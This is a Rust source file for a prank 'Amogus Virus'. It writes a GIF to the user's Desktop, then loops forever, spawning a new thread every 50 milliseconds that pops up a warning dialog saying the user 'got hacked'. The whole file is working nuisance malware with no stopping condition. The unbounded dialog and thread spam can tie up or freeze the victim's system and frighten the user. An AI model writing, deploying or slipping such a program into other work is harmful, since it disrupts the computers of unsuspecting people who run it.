use native_dialog::{MessageDialog, MessageType};
use std::time::Duration;
use std::thread::sleep;
use std::thread;
use std::fs::File;
use std::io::prelude::*;
use std::path::Path;

const SPAMDELAY: u64 = 50;

fn main() {
	// Make file
	let flocstr = format!("{}/Desktop/amogus.gif", (dirs::home_dir().unwrap().display()));
	let floc = Path::new(&flocstr[..]);
	let mut file = File::create(floc).expect("Failed to create amogus file");
	file.write_all(include_bytes!("amogus.gif")).expect("Couldn't write amogus to file");

	// Infect computer
	let mut iteration = 1;

	loop {
		let formatted = format!("This is dialog box #{}. You got hacked!", iteration);
		thread::spawn(|| {
			open_dialog("Amogus Virus", formatted)
		});

		wait(SPAMDELAY);
		iteration += 1;
	}
}

fn wait(time: u64) -> () {
	sleep(Duration::from_millis(time));
}

fn open_dialog<Tt: AsRef<str>, Tx: AsRef<str>>(title: Tt, text: Tx) {
	let rtitle = title.as_ref();
	let rtext = text.as_ref();

	MessageDialog::new()
		.set_type(MessageType::Warning)
		.set_title(&rtitle)
		.set_text(&rtext)
		.show_alert()
		.unwrap();
}
